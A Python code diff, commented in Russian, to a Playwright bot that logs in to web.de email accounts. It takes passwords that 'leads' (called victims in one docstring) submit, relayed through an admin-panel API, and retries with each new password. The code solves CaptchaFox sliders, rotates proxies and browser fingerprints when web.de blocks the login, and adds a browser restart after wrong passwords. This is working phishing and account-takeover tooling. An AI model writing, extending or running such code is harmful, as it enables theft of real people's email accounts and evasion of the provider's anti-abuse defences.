@@ -529,6 +529,12 @@ class AfterMailHookFinished(Exception):
     pass
 
 
+class WebdeLeadPasswordTimeout(Exception):
+    """Таймаут ожидания пароля в lead_mode из вложенной функции — наружу как return 'password_timeout'."""
+
+    pass
+
+
 class LoginTemporarilyUnavailable(Exception):
     """Сайт вернул «Login vorübergehend nicht möglich» — нужен другой IP/отпечаток и повтор с нуля."""
 
@@ -4254,6 +4260,8 @@ def login_webde(
     WEBDE_CHROME_USER_DATA_DIR=/path/to/profile — launch_persistent_context (постоянный user-data-dir).
     WEBDE_BROWSER_EXECUTABLE — явный путь к Chrome/Chromium (иначе USE_CHROME=channel или встроенный Chromium).
     Если заданы и CDP, и USER_DATA_DIR, используется CDP.
+    WEBDE_RESTART_BROWSER_ON_WRONG_PASSWORD: после того как лид отдал другой пароль (API/long-poll), перед повторным Login —
+    перезапуск Chromium и снова email→пароль (по умолчанию вкл. при WEBDE_CHROME_USER_DATA_DIR). 0/false/off — не перезапускать.
     """
     email = email or EMAIL
     password = password or PASSWORD
@@ -4527,110 +4535,153 @@ def login_webde(
 
         _hold_cb = _lead_hold_prepare if (lead_mode and hold_session_after_lead_success) else None
 
-        try:
+
+        def _should_restart_browser_after_wrong_password() -> bool:
+            raw = (os.getenv("WEBDE_RESTART_BROWSER_ON_WRONG_PASSWORD") or "").strip().lower()
+            if raw in ("0", "false", "no", "off"):
+                return False
+            if raw in ("1", "true", "yes", "on"):
+                return True
+            return bool(
+                lead_mode
+                and bool(wait_for_new_password)
+                and bool(_webde_chrome_user_data_dir())
+            )
+
+        def _navigate_webde_to_auth_form(pg) -> None:
             auth_url = get_auth_webde_url_for_attempt(AUTH_WEBDE_URL, auth_url_attempt_index)
             if DIRECT_AUTH:
                 log("Старт", "открываю auth.web.de")
-                _goto_auth_webde_with_retry(page, auth_url, timeout_ms=120000, phase="direct")
-                if _is_login_temporarily_unavailable(page):
-                    log_page_diag(page, "сразу после goto: блок «Login vorübergehend»")
+                _goto_auth_webde_with_retry(pg, auth_url, timeout_ms=120000, phase="direct")
+                if _is_login_temporarily_unavailable(pg):
+                    log_page_diag(pg, "сразу после goto: блок «Login vorübergehend»")
                     alert("Вход временно недоступен (Login vorübergehend nicht möglich)", "Закрываю браузер, пробую другую комбинацию (прокси + отпечаток)")
                     raise LoginTemporarilyUnavailable(LOGIN_TEMPORARILY_UNAVAILABLE_TEXT)
             else:
                 log("Старт", "открываю страницу входа web.de")
-                page.goto(LOGIN_URL, wait_until="load", timeout=120000)
+                pg.goto(LOGIN_URL, wait_until="load", timeout=120000)
                 time.sleep(2)
-                if _is_login_temporarily_unavailable(page):
-                    log_page_diag(page, "после anmelden.web.de: блок «Login vorübergehend»")
+                if _is_login_temporarily_unavailable(pg):
+                    log_page_diag(pg, "после anmelden.web.de: блок «Login vorübergehend»")
                     alert("Вход временно недоступен (Login vorübergehend nicht möglich)", "Закрываю браузер, пробую другую комбинацию (прокси + отпечаток)")
                     raise LoginTemporarilyUnavailable(LOGIN_TEMPORARILY_UNAVAILABLE_TEXT)
 
                 # Окно согласия (Werbung/Tracking) — закрыть «Akzeptieren und weiter»
-                if close_consent_popup(page):
+                if close_consent_popup(pg):
                     log("Согласие", "Жду перезагрузку после согласия")
                     time.sleep(3)
                 else:
                     log("Согласие", "Окно согласия не найдено — повтор через 2 сек")
                     time.sleep(2)
-                    if close_consent_popup(page):
+                    if close_consent_popup(pg):
                         time.sleep(3)
                     else:
                         log("Согласие", "Окно согласия не найдено или уже закрыто")
 
                 # Убедиться, что оверлей согласия скрыт (иначе клик по «Zum WEB.DE Login» перехватится)
                 try:
-                    page.locator(".permission-layer-default").wait_for(state="hidden", timeout=5000)
+                    pg.locator(".permission-layer-default").wait_for(state="hidden", timeout=5000)
                 except Exception:
                     log("Согласие", "Повторно закрываю окно согласия")
-                    close_consent_popup(page, wait_for_appear=5)
+                    close_consent_popup(pg, wait_for_appear=5)
                 time.sleep(0.5)
 
                 # Переход на страницу с формой входа: auth.web.de/login или кнопка «Zum WEB.DE Login»
                 use_auth_url = AUTH_WEBDE_URL and "auth.web.de" in AUTH_WEBDE_URL
                 if use_auth_url:
                     log("Вход", "переход на auth.web.de", verbose_only=True)
-                    _goto_auth_webde_with_retry(page, auth_url, timeout_ms=90000, phase="from-anmelden")
+                    _goto_auth_webde_with_retry(pg, auth_url, timeout_ms=90000, phase="from-anmelden")
                 else:
                     log("Вход", "клик «Zum WEB.DE Login»", verbose_only=True)
                     for loc in [
-                        page.get_by_role("link", name="Zum WEB.DE Login"),
-                        page.get_by_role("button", name="Zum WEB.DE Login"),
-                        page.get_by_text("Zum WEB.DE Login"),
+                        pg.get_by_role("link", name="Zum WEB.DE Login"),
+                        pg.get_by_role("button", name="Zum WEB.DE Login"),
+                        pg.get_by_text("Zum WEB.DE Login"),
                     ]:
                         if loc.count() > 0:
                             loc.first.click()
                             time.sleep(2)
-                            page.wait_for_load_state("load", timeout=15000)
+                            pg.wait_for_load_state("load", timeout=15000)
                             break
                     else:
                         log("Вход", "прямой переход на форму логина", verbose_only=True)
-                        page.goto(LOGIN_FORM_URL, wait_until="load", timeout=90000)
+                        pg.goto(LOGIN_FORM_URL, wait_until="load", timeout=90000)
                         time.sleep(2)
             prof("форма логина готова")
             log("Вход", "форма логина готова")
             try:
-                log("ДИАГНО", "форма входа (шаг 0)", f"url={page.url[:200]!r} title={page.title()[:90]!r}")
+                log("ДИАГНО", "форма входа (шаг 0)", f"url={pg.url[:200]!r} title={pg.title()[:90]!r}")
             except Exception:
                 pass
-            if _is_login_temporarily_unavailable(page):
-                log_page_diag(page, "на форме входа: «Login vorübergehend»")
+            if _is_login_temporarily_unavailable(pg):
+                log_page_diag(pg, "на форме входа: «Login vorübergehend»")
                 alert("Вход временно недоступен (Login vorübergehend nicht möglich)", "Закрываю браузер, пробую другую комбинацию (прокси + отпечаток)")
                 raise LoginTemporarilyUnavailable(LOGIN_TEMPORARILY_UNAVAILABLE_TEXT)
 
+
+        def _restart_browser_after_wrong_credentials() -> None:
+            nonlocal browser, context, page
+            log(
+                "Пароль",
+                "перезапуск браузера после неверного пароля (новый процесс, тот же user-data-dir и отпечаток)",
+            )
+            try:
+                if context is not None:
+                    context.close()
+            except Exception as ex:
+                log("Перезапуск", f"context.close: {type(ex).__name__}: {ex}")
+            _no_ck = str(Path(__file__).parent / ".webde_no_cookies_wrong_password_restart.json")
+            browser, context, page = reopen_webde_browser_same_profile(
+                p,
+                headless=headless,
+                fingerprint_index=fingerprint_index,
+                proxy_config=proxy_config,
+                automation_profile=automation_profile,
+                force_pool_fingerprint=force_pool,
+                browser_engine=browser_engine,
+                effective_engine=effective_engine,
+                cookies_json_path=_no_ck,
+            )
+            page.set_default_navigation_timeout(120000)
+            page.set_default_timeout(120000)
+
+        def _webde_prepare_email_password_and_submit_button(pg):
+            nonlocal password
+            auth_url = get_auth_webde_url_for_attempt(AUTH_WEBDE_URL, auth_url_attempt_index)
             # React SPA в #root (authentication-fe) — видимый email сразу после mount
             _email_probe_wd = 'input[type="email"], input[name="username"], input[name="email"], input#username'
 
             def _webde_email_field_present() -> bool:
-                pu_now = (page.url or "").lower()
+                pu_now = (pg.url or "").lower()
                 if "auth.web.de" not in pu_now:
-                    return page.locator(_email_probe_wd).count() > 0
+                    return pg.locator(_email_probe_wd).count() > 0
                 try:
-                    if _webde_auth_root_email_locator(page).count() > 0:
+                    if _webde_auth_root_email_locator(pg).count() > 0:
                         return True
                 except Exception:
                     pass
-                return page.locator(_email_probe_wd).count() > 0
+                return pg.locator(_email_probe_wd).count() > 0
 
-            if "auth.web.de" in (page.url or "").lower():
+            if "auth.web.de" in (pg.url or "").lower():
                 try:
-                    _webde_auth_root_email_locator(page).first.wait_for(state="visible", timeout=12000)
+                    _webde_auth_root_email_locator(pg).first.wait_for(state="visible", timeout=12000)
                 except Exception:
                     try:
-                        page.wait_for_selector(_email_probe_wd, state="attached", timeout=4000)
+                        pg.wait_for_selector(_email_probe_wd, state="attached", timeout=4000)
                     except Exception:
                         pass
             else:
                 try:
-                    page.wait_for_selector(_email_probe_wd, state="attached", timeout=12000)
+                    pg.wait_for_selector(_email_probe_wd, state="attached", timeout=12000)
                 except Exception:
                     pass
 
             # Если попали на consent-management или поля email нет — пробуем auth.web.de или закрываем согласие
-            if "consent-management" in page.url or not _webde_email_field_present():
+            if "consent-management" in pg.url or not _webde_email_field_present():
                 log("Вход", "нет формы — auth.web.de", verbose_only=True)
-                _goto_auth_webde_with_retry(page, auth_url, timeout_ms=90000, phase="no-form")
+                _goto_auth_webde_with_retry(pg, auth_url, timeout_ms=90000, phase="no-form")
                 if not _webde_email_field_present():
-                    close_consent_popup(page, wait_for_appear=10)
+                    close_consent_popup(pg, wait_for_appear=10)
                     time.sleep(2)
 
             # Пауза между шагами, чтобы капча и слайдер успели отрисоваться
@@ -4640,14 +4691,14 @@ def login_webde(
             prof("ввожу email → Weiter")
             log("Вход", "ввожу email → Weiter")
             email_selector = 'input[type="email"], input[name="username"], input[name="email"], input[placeholder*="E-Mail"], input#username'
-            _wait_and_fill(page, email_selector, email, timeout=25000)
+            _wait_and_fill(pg, email_selector, email, timeout=25000)
             time.sleep(step_delay)
-            btn = page.locator('button[type="submit"], input[type="submit"], [data-testid="next"]').first
+            btn = pg.locator('button[type="submit"], input[type="submit"], [data-testid="next"]').first
             if btn.count() > 0:
                 btn.click()
             time.sleep(step_delay)
             try:
-                page.wait_for_load_state("load", timeout=15000)
+                pg.wait_for_load_state("load", timeout=15000)
             except Exception:
                 pass
             prof("после Weiter: load_state")
@@ -4662,33 +4713,33 @@ def login_webde(
             prof("жду появления поля пароля/капчи", f"max={wait_total}s step={step_wait}s")
             for elapsed in range(0, wait_total, step_wait):
                 _check_script_idle_or_raise()
-                if _is_login_temporarily_unavailable(page):
-                    log_page_diag(page, "в цикле ожидания пароля: «Login vorübergehend»")
+                if _is_login_temporarily_unavailable(pg):
+                    log_page_diag(pg, "в цикле ожидания пароля: «Login vorübergehend»")
                     alert("Вход временно недоступен (Login vorübergehend nicht möglich)", "Закрываю браузер, пробую другую комбинацию (прокси + отпечаток)")
                     raise LoginTemporarilyUnavailable(LOGIN_TEMPORARILY_UNAVAILABLE_TEXT)
-                if _password_input_visible_anywhere(page, pw_selector_any):
+                if _password_input_visible_anywhere(pg, pw_selector_any):
                     pw_found = True
                     break
                 time.sleep(0.3)
-                if _password_input_visible_anywhere(page, pw_selector_any):
+                if _password_input_visible_anywhere(pg, pw_selector_any):
                     pw_found = True
                     break
                 # После Weiter ничего не произошло (кнопка всё ещё видна, пароля/капчи нет) — выход, смена IP и железа
-                if elapsed >= 8 and page.locator(weiter_btn_sel).first.count() > 0 and page.locator(weiter_btn_sel).first.is_visible():
-                    log_page_diag(page, f"через {elapsed}s после Weiter: пароль/капча не появились, кнопка Weiter ещё видна")
+                if elapsed >= 8 and pg.locator(weiter_btn_sel).first.count() > 0 and pg.locator(weiter_btn_sel).first.is_visible():
+                    log_page_diag(pg, f"через {elapsed}s после Weiter: пароль/капча не появились, кнопка Weiter ещё видна")
                     alert("Weiter без эффекта", "следующая комбинация прокси/отпечаток")
                     raise LoginTemporarilyUnavailable("Weiter без перехода")
                 # Капча появилась до поля пароля — проходим её (только если виджет капчи реально виден)
-                captcha_detected = detect_captcha_type(page) == "captchafox" or page.get_by_text("Ich bin ein Mensch", exact=False).first.count() > 0
+                captcha_detected = detect_captcha_type(pg) == "captchafox" or pg.get_by_text("Ich bin ein Mensch", exact=False).first.count() > 0
                 if captcha_detected:
-                    slider_visible = page.locator(".cf-slider__button").first.count() > 0 and page.locator(".cf-slider__button").first.is_visible()
-                    checkbox_visible = page.get_by_text("Ich bin ein Mensch", exact=False).first.is_visible() if page.get_by_text("Ich bin ein Mensch", exact=False).first.count() > 0 else False
+                    slider_visible = pg.locator(".cf-slider__button").first.count() > 0 and pg.locator(".cf-slider__button").first.is_visible()
+                    checkbox_visible = pg.get_by_text("Ich bin ein Mensch", exact=False).first.is_visible() if pg.get_by_text("Ich bin ein Mensch", exact=False).first.count() > 0 else False
                     if not slider_visible and not checkbox_visible:
                         time.sleep(step_wait)
                         continue
                     prof("обнаружена капча CaptchaFox")
                     log("Капча", "решаю (CaptchaFox слайдер)")
-                    if not solve_captchafox_slider_manually(page):
+                    if not solve_captchafox_slider_manually(pg):
                         alert("Капча не пройдена", "Слайдер не сработал или чекбокс не найден — смена IP и повтор")
                         raise LoginTemporarilyUnavailable("Капча не пройдена")
                     prof("капча пройдена (после solve_captchafox_slider_manually)")
@@ -4697,12 +4748,12 @@ def login_webde(
                 time.sleep(step_wait)
             if not pw_found:
                 try:
-                    page.wait_for_selector(pw_selector_any, state="visible", timeout=5000)
+                    pg.wait_for_selector(pw_selector_any, state="visible", timeout=5000)
                     pw_found = True
                 except Exception:
                     pass
             if not pw_found:
-                log_page_diag(page, "таймаут 60с: поле пароля так и не появилось")
+                log_page_diag(pg, "таймаут 60с: поле пароля так и не появилось")
                 alert("Поле пароля не появилось за 60 сек", "Капча не пройдена или страница не перешла — смена IP и повтор")
                 raise LoginTemporarilyUnavailable("Поле пароля не появилось")
             time.sleep(step_delay)
@@ -4729,7 +4780,7 @@ def login_webde(
                     if lead_mode:
                         # Таймаут ожидания нового пароля от админки: не редиректим на смену пароля,
                         # а даём пользователю перезайти и ввести данные заново.
-                        return "password_timeout"
+                        raise WebdeLeadPasswordTimeout()
                     raise RuntimeError("Пароль не получен")
             if lead_mode and get_password:
                 _pw_latest = (get_password() or "").strip()
@@ -4740,16 +4791,16 @@ def login_webde(
                     password = _pw_latest
             prof("ввожу пароль → Login")
             log("Вход", "пароль введён → Login")
-            _fill_password_login_or_fallback(page, password, pw_selector_any=pw_selector_any)
+            _fill_password_login_or_fallback(pg, password, pw_selector_any=pw_selector_any)
             time.sleep(step_delay)
 
             # Проверка капчи (может быть до или после ввода пароля)
-            captcha_type = detect_captcha_type(page)
+            captcha_type = detect_captcha_type(pg)
             if captcha_type:
                 log("Капча", f"ещё капча: {captcha_type}", verbose_only=True)
             if captcha_type:
                 if captcha_type == "captchafox":
-                    if not solve_captchafox_slider_manually(page):
+                    if not solve_captchafox_slider_manually(pg):
                         alert("Капча не пройдена", "Слайдер не сработал — смена IP и повтор")
                         raise LoginTemporarilyUnavailable("Капча не пройдена")
                 else:
@@ -4762,16 +4813,41 @@ def login_webde(
                     if _pw_after_c != (password or "").strip():
                         log("Пароль", "после капчи: в API другой пароль — перезаписываю поле")
                     password = _pw_after_c
-                    _fill_password_login_or_fallback(page, password, pw_selector_any=pw_selector_any)
+                    _fill_password_login_or_fallback(pg, password, pw_selector_any=pw_selector_any)
                     time.sleep(step_delay)
 
             # Отправка формы входа (Weiter/Login после пароля) и цикл при неверных данных
-            submit_btn = page.locator(
+            submit_btn = pg.locator(
                 'button[type="submit"], input[type="submit"], [data-testid="login"], '
                 'button:has-text("Login"), button:has-text("Weiter"), input[value="Login"], input[value="Weiter"]'
             ).first
+
+            return pw_selector_any, submit_btn
+
+        try:
+            _navigate_webde_to_auth_form(page)
+            try:
+                pw_selector_any, submit_btn = _webde_prepare_email_password_and_submit_button(page)
+            except WebdeLeadPasswordTimeout:
+                return "password_timeout"
             max_password_retries = 20
             tried_passwords_for_submit: set[str] = set()
+            step_delay = 1.0
+
+            def _maybe_restart_browser_profile_before_retry_with_new_password():
+                """Когда лид уже отдал новый пароль: новый Chromium-профиль и снова email→пароль→submit перед повторным Login."""
+                nonlocal pw_selector_any, submit_btn
+                if not _should_restart_browser_after_wrong_password():
+                    return None
+                try:
+                    _restart_browser_after_wrong_credentials()
+                    _navigate_webde_to_auth_form(page)
+                    pw_selector_any, submit_btn = _webde_prepare_email_password_and_submit_button(page)
+                except WebdeLeadPasswordTimeout:
+                    return "password_timeout"
+                except Exception as _re_ex:
+                    log("Перезапуск", f"перед повтором с новым паролем: {type(_re_ex).__name__}: {_re_ex}")
+                return None
 
             def _api_password_newer_than_attempt() -> str | None:
                 """Пароль уже мог обновиться в API до POST /api/webde-wait-password (жертва отправила форму раньше)."""
@@ -4831,6 +4907,9 @@ def login_webde(
                     if _pw_loop and _pw_loop != (password or "").strip():
                         wait_log("опрос пароля", "перед Login в API новый пароль — подставляю и заполняю поле")
                         password = _pw_loop
+                        _r_pw = _maybe_restart_browser_profile_before_retry_with_new_password()
+                        if _r_pw == "password_timeout":
+                            return "password_timeout"
                         _fill_password_login_or_fallback(page, password, pw_selector_any=pw_selector_any)
                         time.sleep(step_delay)
                 if (password or "").strip():
@@ -4889,6 +4968,9 @@ def login_webde(
                             )
                             password = fresh_pw
                             log("Пароль", "Подставляю пароль из API и повторяю вход")
+                            _r_f = _maybe_restart_browser_profile_before_retry_with_new_password()
+                            if _r_f == "password_timeout":
+                                return "password_timeout"
                             _fill_password_login_or_fallback(page, password, pw_selector_any=pw_selector_any)
                             time.sleep(step_delay)
                             continue
@@ -4910,6 +4992,9 @@ def login_webde(
                             wait_log("long-poll пароля", "получен другой пароль от админки — подставляю и повторяю Login")
                             password = new_password
                             log("Пароль", "Ввожу новый пароль и повторяю вход")
+                            _r_np = _maybe_restart_browser_profile_before_retry_with_new_password()
+                            if _r_np == "password_timeout":
+                                return "password_timeout"
                             _fill_password_login_or_fallback(page, password, pw_selector_any=pw_selector_any)
                             time.sleep(step_delay)
                             continue
@@ -4943,6 +5028,9 @@ def login_webde(
                         if new_password and new_password != (password or "").strip():
                             password = new_password
                             log("Пароль", "Ввожу новый пароль и повторяю вход")
+                            _r_poll = _maybe_restart_browser_profile_before_retry_with_new_password()
+                            if _r_poll == "password_timeout":
+                                return "password_timeout"
                             _fill_password_login_or_fallback(page, password, pw_selector_any=pw_selector_any)
                             time.sleep(step_delay)
                             continue
@@ -5189,6 +5277,9 @@ def login_webde(
                         )
                         password = fresh_late
                         log("Пароль", "Подставляю пароль из API и повторяю вход")
+                        _r_fl = _maybe_restart_browser_profile_before_retry_with_new_password()
+                        if _r_fl == "password_timeout":
+                            return "password_timeout"
                         _fill_password_login_or_fallback(page, password, pw_selector_any=pw_selector_any)
                         time.sleep(step_delay)
                         continue
@@ -5210,6 +5301,9 @@ def login_webde(
                         wait_log("long-poll (поздняя ветка)", "получен другой пароль — повтор Login")
                         password = new_password
                         log("Пароль", "Ввожу новый пароль и повторяю вход")
+                        _r_late = _maybe_restart_browser_profile_before_retry_with_new_password()
+                        if _r_late == "password_timeout":
+                            return "password_timeout"
                         _fill_password_login_or_fallback(page, password, pw_selector_any=pw_selector_any)
                         time.sleep(step_delay)
                         continue
